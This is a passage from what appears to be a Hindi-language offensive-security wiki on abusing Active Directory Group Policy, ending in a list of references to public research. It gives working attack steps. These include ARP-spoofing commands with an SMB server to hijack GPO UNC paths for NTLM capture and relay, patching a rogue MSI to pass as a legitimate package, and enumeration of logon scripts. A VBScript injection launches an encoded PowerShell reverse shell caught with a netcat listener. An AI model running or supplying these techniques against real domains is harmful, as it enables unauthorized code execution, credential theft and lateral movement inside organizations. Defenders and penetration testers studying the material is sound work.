- Windows Installer आमतौर पर deployment को package **`ProductCode`** से track करता है। अगर product पहले से installed है, तो deployment skip किया जा सकता है।
- Installer rejection से बचने के लिए, rogue MSI को patch करें ताकि उसका **`ProductCode`** और **`PackageCode`**, GPO द्वारा अपेक्षित legitimate package से match करें।
- पुरानी `.aas` advertisement files `SYSVOL` में मौजूद रह सकती हैं, इसलिए इस पर निर्भर होने से पहले validate करें कि deployment अब भी active दिखता है।

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP drive mappings in `Drives.xml` के कारण users, logon या reconnection के दौरान configured UNC path पर authenticate करते हैं। अगर आप referenced host को spoof करते हैं, तो **NetNTLMv2** capture कर सकते हैं। अगर SMB को जानबूझकर fail कराया जाए, तो Windows **WebDAV** पर retry कर सकता है और **NTLM over HTTP** भेज सकता है। इससे **LDAP(S)**, **AD CS**, या **SMB** पर relay करना कहीं अधिक आसान हो जाता है।

#### Logon/startup script UNC hijack

यही तरीका `SYSVOL` में मिले UNC-hosted scripts पर भी लागू होता है:

- **Logon scripts** आमतौर पर **user** context में execute होते हैं।
- **Startup scripts** आमतौर पर **computer / SYSTEM** context में execute होते हैं।

अगर script path किसी spoof किए जा सकने वाले hostname की ओर point करता है, तो UNC host को redirect करें और expected location से replacement script content serve करें।

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` या `\\<dc>\NETLOGON\` के अंतर्गत writable paths से GPO के ज़रिए user logon के समय execute होने वाली logon scripts में छेड़छाड़ की जा सकती है। इससे logon करने वाले users के security context में code execution मिलता है।

### Logon scripts ढूँढें
- Configured logon script के लिए user attributes जाँचें:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- scripts के shortcuts या references खोजने के लिए domain shares को crawl करें:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- `.lnk` फ़ाइलों को parse करके उन targets को resolve करें जो SYSVOL/NETLOGON की ओर point करते हैं (यह एक उपयोगी DFIR तरकीब है और उन attackers के लिए भी, जिनके पास direct GPO access नहीं है):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound मौजूद होने पर user object का `scriptPath` logon-script attribute दिखाता है। GPO-configured logon scripts एक अलग policy reference हैं, इसलिए लागू GPO का भी निरीक्षण करें।

### Write access सत्यापित करें (share listings पर भरोसा न करें)
Automated tooling, SYSVOL/NETLOGON को read-only दिखा सकता है, भले ही सटीक script पर अलग NTFS ACL हो। उस file और उसकी parent directory का read-only inspection करके शुरुआत करें; मेल खाने वाले Allow ACE अभी भी संभावित हैं, क्योंकि प्रभावी SMB और NTFS access, Deny ACE और मौजूदा token—सभी मायने रखते हैं:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

एक अधिकृत write test target-specific और reversible होना चाहिए, जिसमें original script का backup लेकर उसे restore किया जाए। केवल access जाँचने के लिए किसी working logon script को overwrite न करें; सफल write अगली बार user के logon पर चल सकता है।

### RCE के लिए VBScript logon script में malicious code जोड़ें
एक ऐसा command जोड़ें जो PowerShell reverse shell लॉन्च करे (revshells.com से generate करें) और business function को बाधित होने से बचाने के लिए original logic बनाए रखें:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

अपने host पर सुनें और अगले interactive logon की प्रतीक्षा करें:

```bash
rlwrap -cAr nc -lnvp 443
```

Notes:
- Execution, logging user के token के अंतर्गत होता है (SYSTEM नहीं)। इसका scope वह GPO link (OU, site, domain) है जो उस script को लागू करता है।
- उपयोग के बाद मूल content/timestamps बहाल करके सफ़ाई करें।


## References

- [1] [Active Directory ACLs/ACEs का दुरुपयोग](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Privileged Accounts और Token Privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – ACL Attack Path अपडेट](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Active Directory में ACLs के ज़रिए privileges बढ़ाना](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Active Directory Privileges और Privileged Accounts की स्कैनिंग](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Linux से AD attribute/UAC operations](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (group membership)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, और DC admin तक DPAPI decryption](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Code Execution और NTLM Relay के लिए GPO UNC Paths को hijack करना](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: NTLM relaying के ज़रिए Active Directory GPOs का शोषण, और अन्य तरीके](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU having a laugh? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: Active Directory में छिपे Organizational Units के ACL attack vectors का शोषण](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [नेटवर्क पर वैध Active Directory services का अनुकरण: GPO exploitation का मामला](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — OU movement और inherited ACL abuse](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
